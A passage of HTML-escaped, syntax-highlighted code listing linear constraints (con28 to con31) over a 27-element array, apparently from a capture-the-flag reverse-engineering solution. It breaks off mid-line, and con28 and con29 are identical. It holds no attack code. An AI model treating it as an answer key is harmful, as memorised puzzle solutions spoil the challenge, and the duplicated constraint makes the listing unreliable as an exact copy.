con28 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;62119&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;17215&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;289621&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;53006&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;95969&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;202404&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;247060&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;144211&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;280106&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;126431&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;226837&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10463&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;121257&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;84190&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;88917&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;15453&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;271442&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;110851&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;231422&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;176741&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;266134&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;197327&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;55225&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;265465&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;119612&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;98514358&lt;/span&gt;
con29 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;62119&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;17215&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;289621&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;53006&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;95969&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;202404&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;247060&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;144211&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;280106&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;126431&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;226837&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10463&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;121257&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;84190&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;88917&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;15453&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;271442&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;110851&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;231422&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;176741&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;266134&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;197327&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;55225&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;265465&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;119612&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;98514358&lt;/span&gt;
con30 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;151924&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;265311&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;107604&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;47851&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;227178&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;162699&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2171&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;211070&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;94815&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;124760&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;41462&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;277022&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;62501&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;17727&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;257908&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;175112&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8972&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;71801&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;114724&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;252898&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;161457&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;64461&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;111493&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;200145&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;290075&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;158466&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;275262&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;86899519&lt;/span&gt;
con31 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;142850&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;166704&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;284852&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;248972&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;76200&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;261708&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;91911&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;22347&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;76006&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;256511&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;100052&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;115830&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;93202&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;248858&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;262669&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;67895&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;111771&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;132193&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;141512&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span 